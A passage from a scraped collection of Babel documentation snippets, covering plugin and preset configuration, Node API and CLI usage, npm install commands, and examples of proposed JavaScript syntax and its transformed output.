[\"@babel/plugin-syntax-logical-assignment-operators\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use @babel/preset-stage-3 via Node API\nDESCRIPTION: Uses the Babel Node API to transform JavaScript code using the @babel/preset-stage-3 preset. This allows for programmatic transformation of code within a Node.js environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-3.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-stage-3\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration for RegExp Modifiers\nDESCRIPTION: This JSON configuration snippet shows how to enable the Inline RegExp modifiers proposal in Babel by installing the `@babel/plugin-proposal-regexp-modifiers` plugin and adding it to the Babel configuration file. This allows Babel to transform code using the new RegExp syntax.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"],\n  \"plugins\": [\n    // Add this!\n    \"@babel/plugin-proposal-regexp-modifiers\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API - JavaScript\nDESCRIPTION: This code snippet demonstrates how to use the plugin programmatically via the Node API. It uses `transformSync` to transform the provided code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-explicit-resource-management.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-explicit-resource-management\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Input JavaScript Code Example\nDESCRIPTION: Illustrates example JavaScript code that will be transformed by the babel-plugin-minify-replace plugin. This code includes conditional statements that depend on the `__DEV__` identifier, which the plugin will replace based on configuration options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nif (!__DEV__) {\n  foo();\n}\nif (a.__DEV__) {\n  foo();\n}\n```\n\n----------------------------------------\n\nTITLE: Importing React Component with React.lazy (After)\nDESCRIPTION: This JavaScript snippet shows how to import a React component using `React.lazy` after the tree-shaking optimization was applied. The `/*#__PURE__*/` annotation is injected before the `React.lazy` call to mark it as a pure function, allowing tree-shaking tools to remove it if it's unused.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport React from 'react';\nconst SomeComponent = /*#__PURE__*/React.lazy(() => import('./SomeComponent'));\n```\n\n----------------------------------------\n\nTITLE: Set Public Class Fields JavaScript\nDESCRIPTION: This code snippet demonstrates the use of public class fields in JavaScript. When the `setPublicClassFields` assumption is active, Babel assumes that public class fields don't shadow any getter in the current class, its subclasses, or its superclass. This permits Babel to assign them directly rather than with `Object.defineProperty`, boosting performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_20\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Test {\n  field = 2;\n\n  static staticField = 3;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/preset-stage-1 in babel.config.json\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/preset-stage-1` preset in a `babel.config.json` file.  Babel will load this preset when transforming JavaScript code. The `presets` array specifies the list of presets to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-1.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-stage-1\"]\n}\n```\n\n----------------------------------------\n\nTITLE: CallExpression TypeParameters Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `typeParameters` to `typeArguments` in CallExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_26\n\nLANGUAGE: typescript\nCODE:\n```\nfn<string>()\n```\n\n----------------------------------------\n\nTITLE: Transforming with CLI\nDESCRIPTION: Uses the Babel CLI to transform a script.js file, enabling the @babel/plugin-syntax-dynamic-import plugin. This allows processing of dynamic import() syntax during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-dynamic-import script.js\n```\n\n----------------------------------------\n\nTITLE: Record and Tuple transformation example\nDESCRIPTION: Demonstrates the transformation of Record and Tuple syntax using the plugin. The plugin transforms the #[] syntax into Tuple() calls.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-record-and-tuple.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nlet a = #[1, 2, 3];\n\n// ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇\n\nlet a = Tuple(1, 2, 3);\n```\n\n----------------------------------------\n\nTITLE: Setting up Babel registration in Mocha\nDESCRIPTION: This YAML configuration file, `.mocharc.yaml`, sets up Babel registration for Mocha tests. It specifies `@babel/register` as a required module, enabling Mocha to transpile ES6+ code using Babel before running tests. This ensures that Mocha can execute modern JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/mocha/usage.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nrequire:\n  - '@babel/register'\n```\n\n----------------------------------------\n\nTITLE: Transforming RegExp Property of Strings (JavaScript)\nDESCRIPTION: This example illustrates how the plugin transforms a regular expression that uses the Emoji_Keycap_Sequence property with the `v` flag into a `u` flag regular expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n/^\\p{Emoji_Keycap_Sequence}$/v.test(\"*\\uFE0F\\u20E3\");\n// true\n```\n\nLANGUAGE: javascript\nCODE:\n```\n/^(?:\\*️⃣|#️⃣|0️⃣|1️⃣|2️⃣|3️⃣|4️⃣|5️⃣|6️⃣|7️⃣|8️⃣|9️⃣)$/u.test(\"*\\uFE0F\\u20E3\");\n// true\n```\n\n----------------------------------------\n\nTITLE: Registering a custom Babel preset\nDESCRIPTION: This shows how to register a custom Babel preset using Babel.registerPreset.  It includes options for builtin presets and plugins. Allows for customized transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\n// Define a preset\nBabel.registerPreset(\"env-plus\", {\n  presets: [[Babel.availablePresets[\"env\"], { loose: true }]],\n  plugins: [\n    [\n      Babel.availablePlugins[\"proposal-decorators\"],\n      { version: \"2023-01\" },\n    ],\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Running Nodemon with npm Script for Babel Node\nDESCRIPTION: This snippet shows how to execute Nodemon using the configured npm script `babel-node`. Nodemon monitors for file changes and automatically restarts the application. `--exec npm run babel-node` specifies that Nodemon should execute the `babel-node` npm script when changes are detected, targeting the specified JavaScript file `path/to/script.js`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/nodemon/usage.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnodemon --exec npm run babel-node -- path/to/script.js\n```\n\n----------------------------------------\n\nTITLE: Checking for LVal Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a left-hand side expression, as used in assignment expressions and `ForXStatement`s. It uses the `t.isLVal(node)` method from Babel's `types` API. It covers nodes like `Identifier`, `MemberExpression`, `ArrayPattern`, and `ObjectPattern`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_278\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isLVal(node);\n```\n\n----------------------------------------\n\nTITLE: Legacy Babel Plugin Example (JS)\nDESCRIPTION: This code demonstrates an outdated way of defining a Babel plugin using named exports for `name` and `visitor`. This pattern is no longer supported and requires migration to a default export.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_79\n\nLANGUAGE: javascript\nCODE:\n```\nexport const name = \"legacy-babel-plugin\";\nexport const visitor = {\n  Identifier() {}\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Example of how to use the `@babel/plugin-proposal-export-default-from` plugin with the Babel Node API. It transforms the input `code` string using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-export-default-from.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-export-default-from\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transformed instanceof Operator JavaScript\nDESCRIPTION: This JavaScript code snippet shows the output of the transformation applied by the `@babel/plugin-transform-instanceof` plugin. It uses a helper function `_instanceof` to provide compatibility with the `Symbol.hasInstance` method when available. The function checks if `right` is not null, if `Symbol` is defined and the `right` object has the `Symbol.hasInstance` property, calling it. If those conditions are not met, it falls back to the native `instanceof` operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-instanceof.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction _instanceof(left, right) {\n  if (\n    right != null &&\n    typeof Symbol !== \"undefined\" &&\n    right[Symbol.hasInstance]\n  ) {\n    return right[Symbol.hasInstance](left);\n  } else {\n    return left instanceof right;\n  }\n}\n\n_instanceof(foo, Bar);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with async-do-expressions Plugin\nDESCRIPTION: This JSON configuration enables the @babel/plugin-syntax-async-do-expressions plugin in Babel using a babel.config.json file. This configuration only enables the parsing of the async do expressions syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-do-expressions.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-async-do-expressions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via Node API\nDESCRIPTION: Illustrates how to use the @babel/plugin-syntax-nullish-coalescing-operator plugin through the Babel Node API. This code snippet showcases transforming a string of code, enabling the parsing of the nullish coalescing operator syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-nullish-coalescing-operator.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-nullish-coalescing-operator\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Hack-style Pipeline Operator in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates the use of the Hack-style pipeline operator with the `#` topic token. It showcases how to chain operations using the `|>` operator and reference the previous pipeline step's value with the `#` token. The example transforms the string \"World\" into \"Hello, World!\" and displays it in an alert.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-07-26-7.15.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Input\n\"World\"\n  |> `Hello, ${#}!`\n  |> alert(#);\n\n// output\nvar _ref, _ref2;\n\n_ref2 = (_ref = \"World\", `Hello, ${_ref}!`), alert(_ref2);\n```\n\n----------------------------------------\n\nTITLE: Virtual Methods with Function Bind (ES7)\nDESCRIPTION: This JavaScript (ES7) snippet demonstrates the use of the function bind syntax (::) with virtual methods from an 'iterlib' library. It chains `map`, `takeWhile`, and `forEach` functions to process data retrieved by `getPlayers()`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { map, takeWhile, forEach } from \"iterlib\";\n\ngetPlayers()\n::map(x => x.character())\n::takeWhile(x => x.strength > 100)\n::forEach(x => console.log(x));\n```\n\n----------------------------------------\n\nTITLE: TypeScript Instantiation Expressions Example\nDESCRIPTION: This TypeScript code snippet illustrates instantiation expressions, a new feature in TypeScript 4.7, allowing type arguments to be specified without invoking the function.  It defines a generic `identity` function and then creates a `stringIdentity` function by specifying the type argument `<string>`. No specific dependencies are needed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-05-19-7.18.0.md#_snippet_1\n\nLANGUAGE: TypeScript\nCODE:\n```\nconst identity = <T>(val: T) => val;\n\n  const stringIdentity = identity<string>; // (val: string) => string;\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining Output with noDocumentAll Assumption\nDESCRIPTION: Example of how the `loose` option affects the generated code.  Specifically, it shows the output with `noDocumentAll === true` which performs loose equality checks with null, and `noDocumentAll === false` which performs strict equality checks against both `null` and `undefined`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nfoo == null ? void 0 : foo.bar;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nfoo === null || foo === void 0 ? void 0 : foo.bar;\n```\n\n----------------------------------------\n\nTITLE: Configuring the React Preset in .babelrc\nDESCRIPTION: Shows how to configure the `react` preset in the `.babelrc` configuration file. This preset allows Babel to compile JSX syntax to JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\"react\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via CLI (Shell)\nDESCRIPTION: This command demonstrates how to use the @babel/plugin-transform-unicode-sets-regex plugin via the Babel CLI to transform a JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-unicode-sets-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API JavaScript\nDESCRIPTION: Demonstrates how to use the plugin programmatically via the Babel Node API.  The `transformSync` function is used to transform the code string with the plugin applied.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-logical-assignment-operators\"],\n});\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Await example with Smart Pipeline\nDESCRIPTION: This snippet demonstrates how `await` is handled in the Smart pipeline operator. It fetches data from a URL, parses it as JSON, and extracts the `ID` property, using the `#` topic reference.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet newScore = fetch(url)\n  |> await #\n  |> #.json()\n  |> await #\n  |> #.ID;\n\n```\n\n----------------------------------------\n\nTITLE: Record and Tuple in Babel 8\nDESCRIPTION: Presents examples of record and tuple syntax in Babel 8, creating immutable data structures.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\n#{x: 1}\n```\n\nLANGUAGE: javascript\nCODE:\n```\n#[1, 2]\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.js\nDESCRIPTION: This shows how to configure the plugin in your babel configuration file. The plugin is added to the plugins array to enable transformation of for-of loops.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-for-of\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Diff: Add Dynamic Import Plugin\nDESCRIPTION: Shows how to add `@babel/plugin-transform-dynamic-import` to your Babel configuration file to ensure correct transformation of dynamic import statements when using `@babel/plugin-transform-modules-systemjs`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_13\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"plugins\": [\n+   \"@babel/plugin-transform-dynamic-import\",\n    \"@babel/plugin-transform-modules-systemjs\",\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI - Shell\nDESCRIPTION: Applies the `@babel/plugin-transform-dotall-regex` plugin to a JavaScript file using the Babel CLI.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dotall-regex.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --plugins @babel/plugin-transform-dotall-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Configure Babel plugin in babel.config.json\nDESCRIPTION: Shows how to configure the plugin in a `babel.config.json` file.  This is the recommended way to use the plugin.  It adds the plugin to the `plugins` array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-named-capturing-groups-regex.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-named-capturing-groups-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with Browser Targets\nDESCRIPTION: This configuration targets Chrome 55 and the last 2 versions of other browsers using browserslist. It specifies the \"env\" preset with the `targets` option to define the desired browser versions, allowing Babel to transpile code accordingly.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\n    [\"env\", {\n      \"targets\": {\n        \"chrome\": 55,\n        \"browsers\": [\"last 2 versions\"]\n      }\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use babel-plugin-minify-infinity via Node API JavaScript\nDESCRIPTION: This code snippet shows how to use the babel-plugin-minify-infinity plugin programmatically via the Node API using `@babel/core`. It transforms the input `code` string using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-infinity.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-infinity\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Logical Assignment Operators Input JavaScript\nDESCRIPTION: Demonstrates the use of logical assignment operators (||= and &&=) in JavaScript.  This input code will be transformed by the Babel plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\na ||= b;\nobj.a.b ||= c;\n\na &&= b;\nobj.a.b &&= c;\n```\n\n----------------------------------------\n\nTITLE: Object Spread Output with useBuiltIns\nDESCRIPTION: Illustrates how object spread is transpiled when useBuiltIns is set to true, resulting in the usage of Object.assign.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nz = Object.assign({ x }, y);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with Plugin\nDESCRIPTION: Configures Babel to use the `@babel/plugin-syntax-import-meta` plugin by adding it to the `plugins` array in the `babel.config.json` file.  This tells Babel to use the plugin when transforming JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-meta.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-import-meta\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Output JavaScript Generated by @babel/template\nDESCRIPTION: This snippet shows the expected output from the @babel/template examples. It is the result of generating code from the AST created by the template.\nSOURCE: https://github.com/babel/website/blob/main/docs/template.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst myModule = require(\"my-module\");\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin (babel.config.json)\nDESCRIPTION: Example configuration for using the plugin within a babel.config.json file.  This is the recommended approach.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-json-modules\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via CLI\nDESCRIPTION: Command line instruction for using the @babel/plugin-transform-nullish-coalescing-operator via the Babel CLI.  The `--plugins` flag specifies the plugin to use, and `script.js` is the input file to be transformed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-nullish-coalescing-operator script.js\n```\n\n----------------------------------------\n\nTITLE: Install Babel Runtime and Plugin (Shell)\nDESCRIPTION: This snippet showcases the installation of the `@babel/runtime` package as a dependency and `@babel/plugin-transform-runtime` as a dev dependency. This separation is new in Babel 7, allowing for better control over helpers and polyfilling.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\n# install the runtime as a dependency\nnpm install @babel/runtime\n# install the plugin as a devDependency\nnpm install @babel/plugin-transform-runtime --save-dev\n```\n\n----------------------------------------\n\nTITLE: Generator Function Example JavaScript\nDESCRIPTION: This JavaScript code demonstrates the use of `function.sent` within a generator function. The `function.sent` meta-property accesses the value passed to the `next()` method, allowing the generator to receive and process input. The example shows how values are sent to the generator via `next()` and how they are accessed using both `function.sent` and the `yield` expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-sent.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction* generator() {\n  console.log(\"Sent\", function.sent);\n  console.log(\"Yield\", yield);\n}\n\nconst iterator = generator();\niterator.next(1); // Logs \"Sent 1\"\niterator.next(2); // Logs \"Yield 2\"\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining and Non-Null Assertion TypeScript\nDESCRIPTION: This TypeScript code demonstrates the improved interaction between optional chaining (`?.`) and non-null assertions (`!`).  The behavior of the code has been changed to align with TypeScript 3.9, providing more intuitive nullish checks.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_5\n\nLANGUAGE: TypeScript\nCODE:\n```\nfoo?.bar!.baz\n```\n\n----------------------------------------\n\nTITLE: Class Static Initialization Block JavaScript\nDESCRIPTION: This code snippet demonstrates the use of class static initialization blocks, which are now enabled by default in Babel 7.16.0. The static block is executed when the class is first loaded.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-10-29-7.16.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass MyClass {\n  static {\n    doSomeInitialization(MyClass);\n    console.log(\"MyClass initialized!\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin\nDESCRIPTION: Installs the @babel/plugin-transform-function-name plugin as a development dependency using npm.  This allows the plugin to be used within a Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-function-name.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-function-name\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-do-expressions via Node API\nDESCRIPTION: Uses the Babel Node API to transform code with the @babel/plugin-syntax-do-expressions plugin.  This plugin enables the parsing of do expressions within the provided JavaScript code string. Requires @babel/core.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-do-expressions.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-do-expressions\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Nullish Coalescing Operator Input JavaScript\nDESCRIPTION: Demonstrates the nullish coalescing operator (??) in JavaScript.  If `object.foo` is null or undefined, the variable `foo` is assigned the value \"default\". This is the input code that the babel plugin transforms.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = object.foo ?? \"default\";\n```\n\n----------------------------------------\n\nTITLE: Create Identifier AST Node (JavaScript)\nDESCRIPTION: Creates an `Identifier` AST node using the `t.identifier` builder.  This node represents an identifier.  The primary parameter is the name of the identifier.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_77\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.identifier(name);\n```\n\n----------------------------------------\n\nTITLE: Module Attributes Import JavaScript\nDESCRIPTION: This snippet shows how to use module attributes with a static `import` statement to provide additional information about the imported file, such as its type.  This metadata can be used by the engine, module loader, or bundler.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport metadata from \"./package.json\" with type: \"json\";\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin for Smart Pipeline Operator\nDESCRIPTION: This JSON snippet demonstrates how to configure the `@babel/plugin-proposal-pipeline-operator` plugin in `babel.config.json` to enable the Smart Pipeline Operator. The `proposal` option is set to `smart` to enable this specific variant of the pipeline operator.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-01-21-7.3.0.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-pipeline-operator\", { \"proposal\": \"smart\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Const Enum Input\nDESCRIPTION: Input TypeScript code showcasing a const enum definition and usage.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_8\n\nLANGUAGE: typescript\nCODE:\n```\n// Input\nconst enum Animals {\n  Fish,\n}\nconsole.log(Animals.Fish);\n```\n\n----------------------------------------\n\nTITLE: Deferred Import Evaluation in Babel 7\nDESCRIPTION: Presents an example of deferred import evaluation in Babel 7. This allows delaying the execution of import statements until they are actually needed.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_25\n\nLANGUAGE: javascript\nCODE:\n```\nimport defer * as ns from \"dep\";\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with Preset and Plugin (JSON)\nDESCRIPTION: This JSON configuration demonstrates a more complete Babel setup with both a preset and a plugin for numeric separators. It also shows the usage of the literals transform plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_7\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"],\n  \"plugins\": [\"@babel/plugin-transform-numeric-separator\"]\n}\n```\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-numeric-separator\", \"@babel/plugin-transform-literals\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Block-Scoped Functions Plugin (JSON)\nDESCRIPTION: This JSON configuration file shows how to enable the @babel/plugin-transform-block-scoped-functions plugin within a Babel configuration. The \"plugins\" array lists the plugin to be used.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoped-functions.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-block-scoped-functions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installation via npm\nDESCRIPTION: This command installs the `@babel/plugin-proposal-import-defer` plugin as a development dependency using npm.  It prepares your project to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-defer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-import-defer\n```\n\n----------------------------------------\n\nTITLE: Remove isTSX and allExtensions from @babel/preset-typescript - JSON\nDESCRIPTION: This code snippet shows how to remove `isTSX` and `allExtensions` options from `@babel/preset-typescript` configuration in `babel.config.json` file when using `@babel/preset-react`. Babel 8 will handle `.tsx` files automatically.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-react\", { \"runtime\": \"automatic\" }],\n    [\"@babel/preset-typescript\"]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin for Top-Level Await\nDESCRIPTION: This code shows how to add the `@babel/plugin-syntax-top-level-await` plugin to a Babel configuration file (`babel.config.js`). This plugin enables Babel to parse the top-level await syntax. Module bundler support is also needed for proper transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  plugins: [\n    \"@babel/plugin-syntax-top-level-await\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Install @babel/template with npm\nDESCRIPTION: This command installs the @babel/template package as a dev dependency using npm. This package provides utilities for generating ASTs from template strings.\nSOURCE: https://github.com/babel/website/blob/main/docs/template.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/template\n```\n\n----------------------------------------\n\nTITLE: Configure Decorators Plugin Version (JSON)\nDESCRIPTION: Shows how to specify the decorators version using the `version` option in the `@babel/plugin-proposal-decorators` plugin configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"plugins\": [\n     [\"@babel/plugin-proposal-decorators\", {\n       \"version\": \"2023-05\"\n     }]\n   ]\n }\n```\n\n----------------------------------------\n\nTITLE: Configuring Decorators Plugin in babel.config.json\nDESCRIPTION: This JSON configuration snippet shows how to enable the `@babel/plugin-proposal-decorators` plugin in your `babel.config.json` file. The `decoratorsBeforeExport` option is set to `true`, indicating that decorators should be applied before the `export` keyword.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-decorators\", { \"decoratorsBeforeExport\": true }]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration File Example\nDESCRIPTION: This configuration file shows how to enable the @babel/plugin-syntax-module-string-names plugin.  The plugin is added to the 'plugins' array. This is the recommended method for using the plugin.\nSOURCE: 